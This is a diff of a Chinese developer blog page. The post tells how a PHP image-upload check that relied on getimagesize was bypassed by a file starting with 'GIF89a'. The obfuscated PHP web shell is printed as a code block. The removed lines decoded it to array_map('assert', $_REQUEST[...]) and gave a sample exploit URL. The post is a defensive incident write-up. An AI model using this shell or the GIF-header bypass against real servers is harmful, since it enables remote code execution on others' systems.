@@ -385,45 +385,18 @@
 
       
         
-          
-            <p>之前做过一个项目涉及到用户上传图片，当时项目比较小且一个人做就没用框架。上传这部分的验证综合服务器没有安装<code>exif</code>、<code>gd</code>扩展就简单根据 <strong><code>getimagesize</code></strong>(<a href="http://php.net/manual/zh/function.getimagesize.php" target="_blank" rel="external">文档</a>) 函数是否返回false判断，后面出现了问题。</p>
+          <p>之前做过一个项目涉及到用户上传图片，当时项目比较小且一个人做就没用框架。上传这部分的验证综合服务器没有安装<code>exif</code>、<code>gd</code>扩展就简单根据 <strong><code>getimagesize</code></strong>(<a href="http://php.net/manual/zh/function.getimagesize.php">文档</a>) 函数是否返回false判断，后面出现了问题。</p>
 <p>有天一位前同事告知这个项目被朋友hack注入了脚本，就是通过上传操作。</p>
 <p>我登入服务器相应目录，根据时间排序发现了可疑文件，后缀名竟然是 <code>.php</code>，矮油我去，赶紧download下来并删除(线上先暂时加了后缀名验证)，打开一看:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">GIF89a</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    @$bSzrL= <span class="string">"s\x74r\x5fr\x65\x70lac\x65"</span>;</div><div class="line">    @$VwissV= @$bSzrL(<span class="string">'drApO'</span>,<span class="string">''</span>,<span class="string">'adrApOrdrApOraydrApO_drApOmdrApOap'</span>);</div><div class="line">    @$ZXNFh= @$bSzrL(<span class="string">'DBCFzQ'</span>,<span class="string">''</span>,<span class="string">'asseDBCFzQrDBCFzQt'</span>);</div><div class="line">    @$VwissV(@$ZXNFh,(<span class="keyword">array</span>)@$_REQUEST[<span class="string">'csqing123'</span>]);</div></pre></td></tr></table></figure>
-<p>毕竟学识浅薄，没搞过别人也没别人搞过，不太熟悉其中的套路，傻眼了两秒。</p>
-<p>先不管文件中的那些不规则字符变量，问题应该是出在文件开头的 <code>GIF89a</code>。本地测试直接使用<code>getimagesize</code>函数，<code>var_dump</code>出来:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">array(6) &#123;</div><div class="line">  [0]=&gt;</div><div class="line">  int(3360)</div><div class="line">  [1]=&gt;</div><div class="line">  int(15370)</div><div class="line">  [2]=&gt;</div><div class="line">  int(1)</div><div class="line">  [3]=&gt;</div><div class="line">  string(27) &quot;width=&quot;3360&quot; height=&quot;15370&quot;&quot;</div><div class="line">  [&quot;channels&quot;]=&gt;</div><div class="line">  int(3)</div><div class="line">  [&quot;mime&quot;]=&gt;</div><div class="line">  string(9) &quot;image/gif&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这尼玛<code>getimagesize</code>表示也很无奈，然后使用<code>exif_imagetype</code>处理打印出来是1，即常量<code>IMAGETYPE_GIF</code>的值，看来<code>exif</code>扩展也沦陷了。不慌，接着试<code>finfo_open</code>，欣慰的是伴随着一串串的 notice 和 warning, 脚本返回了<code>false</code>，完美。</p>
-<p>原因暂时找到了，接着就是探究文件头的罪魁祸首 <code>GIF89a</code>。查到百科:<br><a href="https://en.wikipedia.org/wiki/Magic_number_(programming" target="_blank" rel="external">Magic number</a>)</p>
-<blockquote>
-<p>Compiled Java class files (bytecode) and Mach-O binaries start with hex CAFEBABE. When compressed with Pack200 the bytes are changed to CAFED00D.</p>
-<p>GIF image files have the ASCII code for “GIF89a” (47 49 46 38 39 61) or “GIF87a” (47 49 46 38 37 61)</p>
-<p>JPEG image files begin with FF D8 and end with FF D9. JPEG/JFIF files contain the ASCII code for “JFIF” (4A 46 49 46) as a null terminated string. JPEG/Exif files contain the ASCII code for “Exif” (45 78 69 66) also as a null terminated string, followed by more metadata about the file.</p>
-<p>PNG image files begin with an 8-byte signature which identifies the file as a PNG file and allows detection of common file transfer problems: \211 P N G \r \n \032 \n (89 50 4E 47 0D 0A 1A 0A). That signature contains various newline characters to permit detecting unwarranted automated newline conversions, such as transferring the file using FTP with the ASCII transfer mode instead of the binary mode.[5]</p>
-</blockquote>
-<p>大致意思是某些特定的文件含有特定的某些字符，而GIF文件的特殊字符是<code>GIF89a</code>,<code>GIF87a</code>。由此可推算<code>getimagesize</code>和<code>exif_imagetype</code>可能就是被文件头部的特殊字符误导判断为GIF文件。<em>(我试了下把文件头的6个字符删得只剩GIF3个字符后依然存在问题 todo)</em></p>
-<p>如果要继续探究这两个有问题的函数的话，得去读源码，大致可以猜到有匹配文件头的N个字符去判断有关。</p>
-<p>没完，继续。</p>
-<p><code>GIF89a</code>后面那些几乎没有可读性的PHP代码究竟是什么？</p>
-<p>简单把变量打印出来便知：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    @$bSzrL= <span class="string">"s\x74r\x5fr\x65\x70lac\x65"</span>;</div><div class="line">    @$VwissV= @$bSzrL(<span class="string">'drApO'</span>,<span class="string">''</span>,<span class="string">'adrApOrdrApOraydrApO_drApOmdrApOap'</span>);</div><div class="line">    @$ZXNFh= @$bSzrL(<span class="string">'DBCFzQ'</span>,<span class="string">''</span>,<span class="string">'asseDBCFzQrDBCFzQt'</span>);</div><div class="line">    @$VwissV(@$ZXNFh,(<span class="keyword">array</span>)@$_REQUEST[<span class="string">'csqing123'</span>]);</div><div class="line"></div><div class="line">    var_dump($bSzrL, $VwissV, $ZXNFh);</div><div class="line"></div><div class="line">    <span class="comment">// 打印结果</span></div><div class="line">    <span class="comment">// string(11) "str_replace"</span></div><div class="line">    <span class="comment">// string(9) "array_map"</span></div><div class="line">    <span class="comment">// string(6) "assert"</span></div></pre></td></tr></table></figure>
-<p>原来<code>\x74</code>,<code>\x5f</code>这些鬼字符串是<strong>十六进制</strong>，双引号下自动解析为相应的字符，查进制表就看到 <code>\x74</code> -&gt; <code>t</code>, <code>\x5f</code> -&gt; <code>_</code>, 其他同理。</p>
-<p>最后经过处理，主要逻辑就一句话：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    array_map(`assert`, (<span class="keyword">array</span>)$_REQUEST[<span class="string">'csqing123'</span>]);</div></pre></td></tr></table></figure>
-<p>即黑客可<strong>通过开头上传的脚本文件通过<code>assert</code>函数执行任何PHP语句</strong>，如：<a href="http://www.myproject.com/uploads/hacker.php?csqing123=exit(&#39;u" target="_blank" rel="external">http://www.myproject.com/uploads/hacker.php?csqing123=exit(&#39;u</a> r hacked’)。</p>
-<p>可怕吧。</p>
-<p>说回正事，上传的图片究竟该如何验证？GIF有此问题，保不准其他类型的图片文件也存在。首先先排除掉 <code>getimagesize</code>,<code>exif_imagetype</code> 这两个函数，蛋疼的是我在 stackoverflow 上看到相关问题顶在最上面的回答很多都是用这俩。当然前面测试通过的<code>finfo</code>扩展可以，也看到有鬼佬建议用户所有上传的图片都通过<code>gd</code>库验证并转化为统一的比如<code>png</code>格式的图片，虽然比较耗CPU资源，但一方面文件类型统一方便处理，另一方面绝对保证了图片文件类型的安全性，也不失为一个方向吧。</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>不可单纯依赖<code>getimagesize</code>,<code>exif_imagetype</code>这两个函数判断文件是否为图片(至少GIF图片)</p>
-<p><br><br><br></p>
-<p>参考资料：</p>
-<blockquote>
-<p><a href="https://en.wikipedia.org/wiki/Magic_number_(programming" target="_blank" rel="external">Magic_number, 魔术数字</a>)</p>
-<p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.networkcomm/conversion_table.htm" target="_blank" rel="external">ASCII，十进制，十六进制，八进制和二进制转换表</a></p>
-<p><a href="https://stackoverflow.com/questions/9314164/php-uploading-files-image-only-checking" target="_blank" rel="external">PHP Uploading files - image only checking</a></p>
-<p><a href="https://stackoverflow.com/questions/2486329/how-can-i-only-allow-certain-filetypes-on-upload-in-php" target="_blank" rel="external">How can I only allow certain filetypes on upload in php?</a></p>
-</blockquote>
-
-          
+<p>毕竟学识浅薄，没搞过别人也没别人搞过，不太熟悉其中的套路，傻眼了两秒。<br>
+          <!--noindex-->
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2017/07/05/php-upload-image-security/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
